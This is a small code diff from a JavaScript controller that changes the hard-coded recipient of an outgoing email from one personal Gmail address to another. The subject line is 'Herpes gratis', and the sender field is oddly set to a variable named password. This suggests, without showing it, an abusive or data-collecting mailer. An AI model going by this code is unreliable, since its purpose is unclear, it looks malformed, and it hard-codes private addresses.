@@ -29,7 +29,7 @@ let controller = {
 
             const mailOpt = {
                 from: password,
-                to: "juliaan657@gmail.com",
+                to: "seragial@gmail.com",
                 subject: "Herpes gratis ,':)!",
                 html: htmlContent
             }
